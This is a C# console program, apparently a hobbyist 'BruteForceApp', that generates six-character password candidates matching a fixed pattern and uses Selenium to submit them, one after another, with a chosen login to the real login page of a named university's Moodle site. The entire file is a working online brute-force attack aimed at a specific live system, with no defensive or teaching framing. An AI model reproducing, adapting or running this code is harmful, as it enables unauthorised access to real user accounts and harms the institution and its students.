using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;

namespace BruteForceApp
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\tWelcome to BRUTE FORCE");
            Console.WriteLine("\tThis program was crated by rozxckyyy\n");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\t1. Hacking (if the SortPasswords.txt file is not filled with passwords)");
            Console.WriteLine("\t2. Hacking (if the SortPasswords.txt file is already filled with passwords)");
            Console.WriteLine("\t3. Exit the program\n");
            Console.Write("\tSelect an item: ");
            string item = Console.ReadLine();

            var enumeration = new Program();


            if (item == "1") { enumeration.WithEnumeration(); }
            else if (item == "2") { enumeration.WithoutEnumeration(); }
            else if (item == "3") { Environment.Exit(0); }
        }

        public void WithEnumeration()
        {
            Console.Write("\n\tEnter login: ");
            string login = Console.ReadLine();
            Console.WriteLine("\n\tThe search for password combinations has begun. Wait");
            string pathSortPasswords = @"SortPasswords.txt";
            var password = "abcdefABCDEF123456";
            var q = password.Select(x => x.ToString());
            int size = 6;
            int count = 0;

            using (StreamWriter writer = new StreamWriter(pathSortPasswords, false)) //Writing passwords in SortPasswords.txt
            {
                for (int i = 0; i < size - 1; i++) //Permutation cycle
                {
                    q = q.SelectMany(x => password, (x, y) => x + y);

                    if (i == size - 2) //Password sorting
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("\n\tThe search combination is over");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("\n\tSorting of passwords by pattern has begun");

                        foreach (string l in q)
                        {
                            if (Regex.IsMatch(l, @"([A-Z]{1}[a-z]{2}\d{3})"))
                            {
                                writer.WriteLine(l);
                                count++;
                            }
                        }
                    }
                }
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n\tPasswords sorted");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"\n\tNumber of possible passwords: {count}");
            Console.WriteLine("\n\t1. Start hacking");
            Console.WriteLine("\t2. Close the program\n");
            Console.Write("\tSelect an item: ");
            string itm = Console.ReadLine();

            if (itm == "1") 
            {
                IWebDriver driver = new ChromeDriver();
                driver.Manage().Window.Maximize();
                driver.Navigate().GoToUrl("https://eluniver.ugrasu.ru/login/index.php");

                using (StreamReader sr = new StreamReader(pathSortPasswords)) //Reading from SortPasswords.txt to a website
                {
                    string pass;
                    while ((pass = sr.ReadLine()) != null)
                    {
                        Thread.Sleep(2000);
                        driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[1]/div[1]/input")).SendKeys(login);
                        Thread.Sleep(100);
                        driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[1]/div[3]/input")).SendKeys(pass);
                        Thread.Sleep(100);
                        driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[5]/div[1]/input[3]")).Click();
                    }
                }
            }
            else if (itm == "2") { Environment.Exit(0); }
        }

        public void WithoutEnumeration()
        {
            Console.Write("\n\tEnter login: ");
            string login = Console.ReadLine();

            string pathSortPasswords = @"SortPasswords.txt";

            IWebDriver driver = new ChromeDriver();
            driver.Manage().Window.Maximize();
            driver.Navigate().GoToUrl("https://eluniver.ugrasu.ru/login/index.php");

            using (StreamReader sr = new StreamReader(pathSortPasswords)) //Reading from SortPasswords.txt to a website
            {
                string pass;
                while ((pass = sr.ReadLine()) != null)
                {
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[1]/div[1]/input")).SendKeys(login);
                    Thread.Sleep(100);
                    driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[1]/div[3]/input")).SendKeys(pass);
                    Thread.Sleep(100);
                    driver.FindElement(By.XPath("/html/body/div[2]/div[5]/div/div/div/div/div/section/div/div/div[1]/div[2]/form/div[5]/div[1]/input[3]")).Click();
                }
            }
        }
    }
}